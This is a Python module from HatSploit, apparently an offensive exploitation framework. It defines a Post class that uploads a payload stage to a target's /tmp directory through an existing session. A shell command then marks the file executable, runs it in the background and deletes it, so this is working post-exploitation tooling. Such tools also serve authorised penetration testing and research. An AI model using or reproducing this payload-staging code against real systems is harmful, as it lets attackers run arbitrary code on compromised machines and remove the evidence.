#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatsploit.core.cli.badges import Badges
from hatsploit.core.session.push import Push

from hatsploit.utils.string import StringTools


class Post(Push, StringTools):
    badges = Badges()

    post_methods = Push().push_methods

    def post(self, platform, payload, sender, args=[], method='auto',
            location='/tmp', delim=';', linemax=100):
        if method in self.post_methods or method == 'auto':
            if method == 'auto':
                for post_method in self.post_methods:
                    if platform in self.post_methods[post_method][0]:
                        method = post_method

                if method == 'auto':
                    self.badges.print_error("Failed to find supported post method!")
                    return False
            else:
                if platform not in self.post_methods[method][0]:
                    self.badges.print_error("Unsupported post method!")
                    return False

            self.badges.print_process(f"Sending payload stage ({str(len(payload))} bytes)...")

            filename = self.random_string(8)
            path = location + '/' + filename

            self.post_methods[method][1].push(payload, sender, path, args, linemax)
            sender(*args, f"sh -c 'chmod 777 {path} {delim} {path} {delim} rm {path}' &")
        else:
            self.badges.print_error("Invalid post method!")
